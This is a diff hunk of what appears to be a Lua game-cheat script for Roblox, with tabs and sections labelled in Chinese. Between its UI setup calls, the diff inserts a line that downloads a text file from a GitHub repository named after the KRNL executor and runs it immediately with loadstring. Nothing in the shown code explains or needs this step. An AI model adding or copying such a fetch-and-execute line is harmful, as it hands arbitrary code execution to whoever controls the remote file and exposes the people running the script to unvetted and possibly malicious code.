@@ -187,6 +187,8 @@ sound.Parent = game.Workspace
 sound:Play()
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tangxianchun/550fx/main/KRNL.txt"))()
+
 local creds = window:Tab("『通用』",'6035145364')
 
 local tool = creds:section("『通用』",true)
